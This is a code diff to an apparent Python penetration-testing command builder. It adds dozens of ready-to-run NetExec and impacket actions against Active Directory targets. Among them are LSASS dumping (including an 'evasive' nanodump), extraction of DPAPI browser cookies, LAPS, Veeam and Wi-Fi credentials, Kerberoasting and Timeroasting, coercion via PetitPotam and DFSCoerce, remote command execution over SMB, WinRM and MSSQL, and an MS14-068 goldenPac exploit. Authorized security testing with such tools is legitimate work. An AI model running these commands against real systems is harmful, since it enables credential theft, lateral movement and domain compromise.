@@ -391,6 +391,90 @@ def b_ms17(ctx):
     return cmd("nxc smb", ctx["target"], "-M ms17-010")
 
 
+# --- NetExec (nxc) extended ---
+def _nxc(proto, ctx, *rest):
+    return cmd(f"nxc {proto}", ctx["target"], nxc_secret(ctx), *rest)
+
+# dumping / secrets
+def b_nxc_dpapi(ctx): return _nxc("smb", ctx, "--dpapi")
+def b_nxc_dpapi_cookies(ctx): return _nxc("smb", ctx, "--dpapi cookies")
+def b_nxc_lsassy(ctx): return _nxc("smb", ctx, "-M lsassy")
+def b_nxc_nanodump(ctx): return _nxc("smb", ctx, "-M nanodump")
+def b_nxc_gpp(ctx): return _nxc("smb", ctx, "-M gpp_password -M gpp_autologin")
+def b_nxc_laps(ctx): return _nxc("smb", ctx, "--laps")
+def b_nxc_veeam(ctx): return _nxc("smb", ctx, "-M veeam")
+def b_nxc_mremoteng(ctx): return _nxc("smb", ctx, "-M mremoteng")
+def b_nxc_keepass(ctx): return _nxc("smb", ctx, "-M keepass_discover")
+def b_nxc_wifi(ctx): return _nxc("smb", ctx, "-M wireless")
+
+# enumeration
+def b_nxc_rid(ctx): return _nxc("smb", ctx, "--rid-brute")
+def b_nxc_sessions(ctx): return _nxc("smb", ctx, "--sessions")
+def b_nxc_disks(ctx): return _nxc("smb", ctx, "--disks")
+def b_nxc_computers(ctx): return _nxc("smb", ctx, "--computers")
+def b_nxc_localgroups(ctx): return _nxc("smb", ctx, "--local-groups")
+def b_nxc_enum_av(ctx): return _nxc("smb", ctx, "-M enum_av")
+def b_nxc_gmsa(ctx): return _nxc("ldap", ctx, "--gmsa")
+def b_nxc_passnotreq(ctx): return _nxc("ldap", ctx, "--password-not-required")
+def b_nxc_userdesc(ctx): return _nxc("ldap", ctx, "-M get-desc-users")
+def b_nxc_trusts(ctx): return _nxc("ldap", ctx, "-M enum_trusts")
+def b_nxc_maq(ctx): return _nxc("ldap", ctx, "-M maq")
+def b_nxc_subnets(ctx): return _nxc("ldap", ctx, "-M subnets")
+def b_nxc_daclread(ctx): return _nxc("ldap", ctx, "-M daclread")
+
+# kerberos via ldap
+def b_nxc_asrep_ldap(ctx): return _nxc("ldap", ctx, "--asreproast asreproast.txt")
+def b_nxc_kerb_ldap(ctx): return _nxc("ldap", ctx, "--kerberoasting kerberoasting.txt")
+def b_nxc_adcs(ctx): return _nxc("ldap", ctx, "-M adcs")
+
+# coercion / checks
+def b_nxc_webdav(ctx): return _nxc("smb", ctx, "-M webdav")
+def b_nxc_coerce(ctx): return _nxc("smb", ctx, "-M coerce_plus")
+def b_nxc_ntlmv1(ctx): return _nxc("smb", ctx, "-M ntlmv1")
+def b_nxc_runasppl(ctx): return _nxc("smb", ctx, "-M runasppl")
+def b_nxc_timeroast(ctx): return cmd("nxc smb", ctx["dc_ip"], "-M timeroast")
+
+# execution / files
+def b_nxc_exec(ctx): return _nxc("smb", ctx, "-x", _q(pv(ctx, "command", "whoami")))
+def b_nxc_exec_ps(ctx): return _nxc("smb", ctx, "-X", _q(pv(ctx, "command", "$PSVersionTable")))
+def b_nxc_winrm_exec(ctx): return _nxc("winrm", ctx, "-x", _q(pv(ctx, "command", "whoami")))
+def b_nxc_mssql_query(ctx): return _nxc("mssql", ctx, "-q", _q(pv(ctx, "query", "SELECT @@version")))
+def b_nxc_mssql_exec(ctx): return _nxc("mssql", ctx, "-x", _q(pv(ctx, "command", "whoami")))
+def b_nxc_putfile(ctx):
+    return _nxc("smb", ctx, "--put-file", _q(pv(ctx, "lfile", "/tmp/file")),
+                _q(pv(ctx, "rfile", "\\\\Windows\\\\Temp\\\\file")))
+def b_nxc_getfile(ctx):
+    return _nxc("smb", ctx, "--get-file", _q(pv(ctx, "rfile", "\\\\Windows\\\\Temp\\\\file")),
+                _q(pv(ctx, "lfile", "/tmp/file")))
+
+
+# --- AD checks (vulns / misconfigurations) ---
+def b_nxc_smbghost(ctx): return cmd("nxc smb", ctx["target"], "-M smbghost")
+def b_nxc_sccm(ctx): return _nxc("smb", ctx, "-M sccm")
+def b_nxc_ldapchecker(ctx): return _nxc("ldap", ctx, "-M ldap-checker")
+def b_nxc_relaylist(ctx): return _nxc("smb", ctx, "--gen-relay-list relay_targets.txt")
+def b_nxc_wcc(ctx): return _nxc("smb", ctx, "-M wcc")
+def b_nxc_unconstrained(ctx): return _nxc("ldap", ctx, "--trusted-for-delegation")
+def b_nxc_admincount(ctx): return _nxc("ldap", ctx, "--admin-count")
+def b_nxc_petitpotam(ctx): return _nxc("smb", ctx, "-M petitpotam")
+def b_nxc_dfscoerce(ctx): return _nxc("smb", ctx, "-M dfscoerce")
+def b_nxc_smbsigning(ctx): return _nxc("smb", ctx, "-M smbsigning")
+def b_nxc_maq_check(ctx): return _nxc("ldap", ctx, "-M maq")
+
+def b_find_delegation(ctx):
+    auth, h, k = imp_auth(ctx)
+    return cmd("impacket-findDelegation", auth, h, k, dcip_flag(ctx))
+
+def b_pre2k(ctx):
+    return cmd("pre2k unauth -d", _q(ctx["domain"]), dcip_flag(ctx),
+               "-inputfile", _q(pv(ctx, "inputfile", "computers.txt")),
+               "-outputfile pre2k_valid.txt")
+
+def b_goldenpac(ctx):  # MS14-068
+    auth, h, k = imp_auth(ctx, ctx["target"])
+    return cmd("impacket-goldenPac", auth, h, k, dcip_flag(ctx))
+
+
 # ---------------------------------------------------------------------------
 # catalog
 # ---------------------------------------------------------------------------
@@ -560,6 +644,128 @@ ACTIONS = [
          desc="Is the print spooler reachable (PrinterBug pre-req)?", build=b_spooler, requires=["user"]),
     dict(id="ms17", cat="Checks", label="MS17-010 (EternalBlue)",
          desc="NetExec ms17-010 check.", build=b_ms17, requires=[]),
+
+    # --- NetExec: Secrets & Dumping ---
+    dict(id="nxc_dpapi", cat="Secrets & Dumping", label="nxc DPAPI",
+         desc="Dump DPAPI secrets (saved creds, wifi, etc.).", build=b_nxc_dpapi, requires=["user"]),
+    dict(id="nxc_dpapi_cookies", cat="Secrets & Dumping", label="nxc DPAPI cookies",
+         desc="Dump browser cookies/logins via DPAPI.", build=b_nxc_dpapi_cookies, requires=["user"]),
+    dict(id="nxc_lsassy", cat="Secrets & Dumping", label="nxc lsassy",
+         desc="Remote LSASS dump via lsassy.", build=b_nxc_lsassy, requires=["user"]),
+    dict(id="nxc_nanodump", cat="Secrets & Dumping", label="nxc nanodump",
+         desc="LSASS dump via nanodump (evasive).", build=b_nxc_nanodump, requires=["user"]),
+    dict(id="nxc_gpp", cat="Secrets & Dumping", label="nxc GPP passwords",
+         desc="cpassword in SYSVOL + autologin.", build=b_nxc_gpp, requires=["user"]),
+    dict(id="nxc_laps", cat="Secrets & Dumping", label="nxc LAPS",
+         desc="Read LAPS local admin passwords.", build=b_nxc_laps, requires=["user"]),
+    dict(id="nxc_veeam", cat="Secrets & Dumping", label="nxc Veeam",
+         desc="Dump Veeam backup credentials.", build=b_nxc_veeam, requires=["user"]),
+    dict(id="nxc_mremoteng", cat="Secrets & Dumping", label="nxc mRemoteNG",
+         desc="Decrypt mRemoteNG saved connections.", build=b_nxc_mremoteng, requires=["user"]),
+    dict(id="nxc_keepass", cat="Secrets & Dumping", label="nxc KeePass discover",
+         desc="Find KeePass databases & processes.", build=b_nxc_keepass, requires=["user"]),
+    dict(id="nxc_wifi", cat="Secrets & Dumping", label="nxc wireless keys",
+         desc="Dump saved wireless passwords.", build=b_nxc_wifi, requires=["user"]),
+
+    # --- NetExec: Enumeration ---
+    dict(id="nxc_rid", cat="Enumeration", label="nxc RID brute",
+         desc="Enumerate users via RID cycling.", build=b_nxc_rid, requires=["user"]),
+    dict(id="nxc_sessions", cat="Enumeration", label="nxc sessions",
+         desc="Active sessions on the host.", build=b_nxc_sessions, requires=["user"]),
+    dict(id="nxc_disks", cat="Enumeration", label="nxc disks",
+         desc="List drives/disks.", build=b_nxc_disks, requires=["user"]),
+    dict(id="nxc_computers", cat="Enumeration", label="nxc computers",
+         desc="Enumerate domain computers.", build=b_nxc_computers, requires=["user"]),
+    dict(id="nxc_localgroups", cat="Enumeration", label="nxc local groups",
+         desc="Local group membership.", build=b_nxc_localgroups, requires=["user"]),
+    dict(id="nxc_enum_av", cat="Enumeration", label="nxc enum AV/EDR",
+         desc="Detect installed AV / EDR.", build=b_nxc_enum_av, requires=["user"]),
+    dict(id="nxc_gmsa", cat="Enumeration", label="nxc gMSA",
+         desc="Read gMSA managed passwords (LDAP).", build=b_nxc_gmsa, requires=["user"]),
+    dict(id="nxc_passnotreq", cat="Enumeration", label="nxc PASSWD_NOTREQD",
+         desc="Accounts not requiring a password.", build=b_nxc_passnotreq, requires=["user"]),
+    dict(id="nxc_userdesc", cat="Enumeration", label="nxc user descriptions",
+         desc="Passwords hidden in user description fields.", build=b_nxc_userdesc, requires=["user"]),
+    dict(id="nxc_trusts", cat="Enumeration", label="nxc domain trusts",
+         desc="Enumerate AD trust relationships.", build=b_nxc_trusts, requires=["user"]),
+    dict(id="nxc_maq", cat="Enumeration", label="nxc MachineAccountQuota",
+         desc="Read ms-DS-MachineAccountQuota.", build=b_nxc_maq, requires=["user"]),
+    dict(id="nxc_subnets", cat="Enumeration", label="nxc subnets",
+         desc="AD sites & subnets.", build=b_nxc_subnets, requires=["user"]),
+    dict(id="nxc_daclread", cat="Enumeration", label="nxc DACL read",
+         desc="Read object DACLs (LDAP).", build=b_nxc_daclread, requires=["user"]),
+
+    # --- NetExec: Kerberos / ADCS ---
+    dict(id="nxc_asrep_ldap", cat="Kerberos & Creds", label="nxc AS-REP roast",
+         desc="AS-REP roast over LDAP.", build=b_nxc_asrep_ldap, requires=["user"]),
+    dict(id="nxc_kerb_ldap", cat="Kerberos & Creds", label="nxc Kerberoast",
+         desc="Kerberoast over LDAP.", build=b_nxc_kerb_ldap, requires=["user"]),
+    dict(id="nxc_adcs", cat="ADCS / Certificates", label="nxc ADCS enum",
+         desc="Enumerate CAs/templates via LDAP.", build=b_nxc_adcs, requires=["user"]),
+
+    # --- NetExec: Coercion / Checks ---
+    dict(id="nxc_webdav", cat="Coercion / Relay", label="nxc WebDAV check",
+         desc="Is the WebClient (WebDAV) service running? (relay pre-req)", build=b_nxc_webdav, requires=["user"]),
+    dict(id="nxc_coerce", cat="Coercion / Relay", label="nxc coerce_plus",
+         desc="Test all coercion methods via NetExec.", build=b_nxc_coerce, requires=["user"]),
+    dict(id="nxc_ntlmv1", cat="Checks", label="nxc NTLMv1",
+         desc="Is NTLMv1 allowed?", build=b_nxc_ntlmv1, requires=["user"]),
+    dict(id="nxc_runasppl", cat="Checks", label="nxc RunAsPPL",
+         desc="Is LSASS protected (RunAsPPL)?", build=b_nxc_runasppl, requires=["user"]),
+    dict(id="nxc_timeroast", cat="Checks", label="nxc Timeroast",
+         desc="Roast computer accounts via NTP (no creds).", build=b_nxc_timeroast, requires=["dc_ip"]),
+
+    # --- NetExec: Execution & Files ---
+    dict(id="nxc_exec", cat="Lateral Movement", label="nxc exec (cmd)",
+         desc="Run a command via SMB.", build=b_nxc_exec,
+         inputs=[T("command", "Command", "whoami /all", "whoami")], requires=["user"]),
+    dict(id="nxc_exec_ps", cat="Lateral Movement", label="nxc exec (PowerShell)",
+         desc="Run PowerShell via SMB.", build=b_nxc_exec_ps,
+         inputs=[T("command", "PowerShell", "Get-Process")], requires=["user"]),
+    dict(id="nxc_winrm_exec", cat="Lateral Movement", label="nxc winrm exec",
+         desc="Run a command via WinRM.", build=b_nxc_winrm_exec,
+         inputs=[T("command", "Command", "whoami", "whoami")], requires=["user"]),
+    dict(id="nxc_mssql_query", cat="Lateral Movement", label="nxc MSSQL query",
+         desc="Run a SQL query.", build=b_nxc_mssql_query,
+         inputs=[T("query", "SQL", "SELECT @@version", "SELECT @@version")], requires=["user"]),
+    dict(id="nxc_mssql_exec", cat="Lateral Movement", label="nxc MSSQL exec",
+         desc="Command exec via xp_cmdshell.", build=b_nxc_mssql_exec,
+         inputs=[T("command", "Command", "whoami", "whoami")], requires=["user"]),
+    dict(id="nxc_putfile", cat="Lateral Movement", label="nxc put-file",
+         desc="Upload a file over SMB.", build=b_nxc_putfile,
+         inputs=[T("lfile", "Local path", "/tmp/file"), T("rfile", "Remote share path", "C$\\Windows\\Temp\\file")], requires=["user"]),
+    dict(id="nxc_getfile", cat="Lateral Movement", label="nxc get-file",
+         desc="Download a file over SMB.", build=b_nxc_getfile,
+         inputs=[T("rfile", "Remote share path", "C$\\Windows\\Temp\\file"), T("lfile", "Local path", "/tmp/file")], requires=["user"]),
+
+    # --- more AD checks ---
+    dict(id="nxc_smbghost", cat="Checks", label="SMBGhost (CVE-2020-0796)",
+         desc="SMBv3 compression RCE check.", build=b_nxc_smbghost, requires=[]),
+    dict(id="nxc_smbsigning", cat="Checks", label="SMB signing required?",
+         desc="Is SMB signing enforced on the host?", build=b_nxc_smbsigning, requires=["user"]),
+    dict(id="nxc_relaylist", cat="Checks", label="SMB signing relay list",
+         desc="List hosts with SMB signing NOT required (relay targets).", build=b_nxc_relaylist, requires=["user"]),
+    dict(id="nxc_ldapchecker", cat="Checks", label="LDAP signing & channel binding",
+         desc="Are LDAP signing / channel binding enforced? (relay surface)", build=b_nxc_ldapchecker, requires=["user"]),
+    dict(id="nxc_sccm", cat="Checks", label="SCCM / MECM discovery",
+         desc="Locate SCCM management points.", build=b_nxc_sccm, requires=["user"]),
+    dict(id="nxc_wcc", cat="Checks", label="Host config audit (wcc)",
+         desc="Windows security misconfiguration audit.", build=b_nxc_wcc, requires=["user"]),
+    dict(id="nxc_petitpotam", cat="Checks", label="PetitPotam check (MS-EFSR)",
+         desc="Is the host coercible via MS-EFSR?", build=b_nxc_petitpotam, requires=["user"]),
+    dict(id="nxc_dfscoerce", cat="Checks", label="DFSCoerce check (MS-DFSNM)",
+         desc="Is the DC coercible via MS-DFSNM?", build=b_nxc_dfscoerce, requires=["user"]),
+    dict(id="find_delegation", cat="Checks", label="Delegation (findDelegation)",
+         desc="Unconstrained / constrained / RBCD delegation.", build=b_find_delegation, requires=["user", "dc_ip"]),
+    dict(id="pre2k", cat="Checks", label="Pre-2000 computer accounts",
+         desc="Computers with default (pre-Windows-2000) passwords.", build=b_pre2k,
+         inputs=[T("inputfile", "Computers file", "computers.txt", "computers.txt")], requires=["domain", "dc_ip"]),
+    dict(id="goldenpac", cat="Checks", label="MS14-068 (goldenPac)",
+         desc="Kerberos PAC validation flaw (legacy DCs).", build=b_goldenpac, requires=["user"]),
+    dict(id="nxc_unconstrained", cat="Enumeration", label="nxc unconstrained delegation",
+         desc="Accounts/computers trusted for delegation.", build=b_nxc_unconstrained, requires=["user"]),
+    dict(id="nxc_admincount", cat="Enumeration", label="nxc adminCount=1",
+         desc="Protected / privileged accounts.", build=b_nxc_admincount, requires=["user"]),
 ]
 
 ACTIONS_BY_ID = {a["id"]: a for a in ACTIONS}
